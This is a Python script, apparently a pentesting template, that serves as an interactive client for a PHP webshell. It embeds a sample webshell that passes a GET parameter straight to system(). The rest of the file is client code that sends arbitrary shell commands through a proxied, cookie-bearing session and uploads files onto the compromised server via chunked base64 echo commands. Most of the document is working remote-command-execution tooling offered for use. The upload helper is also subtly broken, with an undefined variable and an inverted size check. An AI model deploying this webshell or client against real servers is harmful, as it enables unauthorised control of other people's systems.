#!/usr/bin/python3
"""
Webshell-client 
By Gael Favraud OS-65554

A very simple webshell client to make use of webshell more confortable.
It's more like a template than a real finished tool.

Provides a convenient prompt with history and completion from history.

Displays the ouput from the system() call.
If things worked well it is between the startSeq and endSeq strings in the 
HTML response.
If these strings are not found in the response then the whole raw HTML
is printed.

If you're using Kali you might have to install/update some python packages
"""

import requests
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style
import datetime
import os
import base64

# Just an example of webshell to be used with
# The webshell variable is actually never used in this script
webshell = """
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<!-- asdo5426 --><pre><?php if(isset($_GET['cmd'])){system($_GET['cmd'].' 2>&1');}?></pre><!-- awed0903 -->
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
"""

# Parameters ===================================================================
# Update these to fit your needs

# URL of the webshell and GET params (for all cmd executions)
url = 'https://127.0.0.1:9443/webshell.php?param1=value1'
getParams = {'param2' : 'value2'}

# Cookies 
# Can copie paste Cookie header from a request
#   cookies = 'Cookie: SESSID=12345;
#   cookies = {'SESSID':'12345'}
#cookies = {}
cookies = 'Cookie: a=1; b=2, c=3'

# Proxy
#   proxy = None 
# Burp
proxy = {'http':'http://localhost:8080',
    'https':'http://localhost:8080'}

# Delimiters for the system() output or None for raw output
startSeq = '<!-- asdo5426 --><pre>'
endSeq = '</pre><!-- awed0903 -->'
#startSeq = None 
#endSeq = None

historyFile = './webshell_history'

sslVerify = False
uploadChunkSize = 512

# Inits ========================================================================


# Setup prompt
promptSession = PromptSession(
    history=FileHistory( historyFile))
style = Style.from_dict({
    # User input (default text).
    '': '#ff0066',
    # Prompt.
    'prompt': '#aa22ff',
})

promptMessage = [('class:prompt', 'webshell> ')]

# Setup requests session
s = requests.Session()

# To avoid verify SSL certificates (insecure)
if not sslVerify:
    # Disable warnings
    requests.packages.urllib3.disable_warnings()
    s.verify  = False

# Parse and setup cookies
# If it's a string turns it into a dictionary
if type(cookies) is str:
    if cookies.startswith('Cookie: '):
        cookies = cookies[8:]
    r = {}
    for c in cookies.split(','):
        c = c.split('=')
        r[c[0].strip()] = c[1].strip()
    cookies = r
if cookies is not None and len(cookies) > 0:
    s.cookies.update(cookies)

# Setup proxies
if proxy is not None:
    s.proxies.update(proxy)


# # Authentication ===============================================================
# # If auth or other pre operations are needed, do it here
#
# print("[*] Retrieve login page")
# s.get('http://10.1.2.3/login.php')
# 
# print("[*] Sending credentials")
# s.post('http://10.1.2.3/login.php', data = 
#     {'Username':'admin', 'Password':'admin', 'Submit':'Login'})
#
# # Or set cookies (NOT TESTED)
# s.cookies.set("COOKIE_NAME", "value", domain="example.com")

# Helpers ======================================================================

def execCmd(cmd):
    """Send command to webshell and parse response

    EDIT HERE THE PARAMETER FOR SENDING THE COMMAND
    """

    #print('\x1b[34m', end='')
    print("\033[38;2;170;34;255m", end="")

    print('    Time:', datetime.datetime.now()) 
    
    # To get the formatted URL before sending the request
    # (good for debugging and reporting)
    
    # GET request
    getParams['cmd'] = cmd
    req = requests.Request('GET',  url, params=getParams)
    prepReq = s.prepare_request(req)
    print("     GET: %s\n" % prepReq.url)

    # # POST request
    # data['cmd'] = cmd
    # req = requests.Request('POST',  url, params=getParams, data=data)
    # prepReq = s.prepare_request(req)
    # print("     POST: %s\n     Data: %s\n" % (prepReq.url, repr(data))

    print('\x1b[0m', end='')

    # Send request
    r  = s.send(prepReq)

    # Extract command result from response
    if startSeq is None:
        posStart = 0
    else:
        posStart = r.text.find(startSeq)
        if posStart == -1:
            posStart = 0
        else:
            posStart += len(startSeq)
    if endSeq is None:
        posEnd = len(r.text)
    else:
        posEnd = r.text.find(endSeq)
        if posEnd == -1:
            posEnd = len(r.text)

    return r.text[posStart:posEnd]

def uploadFile(localPath, dstPath=None, chunkSize=None):
    """Poor's man method to upload files with echo and base64"""
    # For UNIX only
    # TODO: For Windows
    print("[*] Uploading file \"%s\" to \"%s\"" %(localPath, dstPath))
    try:
        with open(localPath,'rb') as f:
            fileContent  = f.read()
        fileSize = len(fileContent)
    except:
        print("[!] Cannot not read local file %s." % localPath)
        return
    if dstPath is None:
        dstPath = srcPath.split('/')[-1]
    if chunkSize is None or int(chunkSize) <= 0:
        chunkSize = int(chunkSize)
    else:
        chunkSize = uploadChunkSize
    for pos in range(0, fileSize, chunkSize):
        print("[*] Sending bytes %d to %d out of %d" % (pos, pos+chunkSize-1, fileSize))
        chunk = base64.b64encode(fileContent[pos:pos+chunkSize]).decode()
        redir = '>' if pos == 0 else '>>'
        execCmd("echo -n '%s' | base64 -d %s '%s'" %(chunk, redir, dstPath))


# Main loop ====================================================================

print("Internal commands:")
print("  %exit")
print("  %upload localfile; distfile; chunkSize") 
print()

while True:
    cmd = promptSession.prompt(promptMessage, 
        auto_suggest=AutoSuggestFromHistory(),
        style = style )
    if cmd == '%exit':
        break
    elif cmd.startswith("%upload "):
        #TODO: better parsing with quotes and all
        args = [_.strip() for _ in cmd[8:].split(';')]
        uploadFile(*args)
    else:
        res = execCmd(cmd)
        print(res)


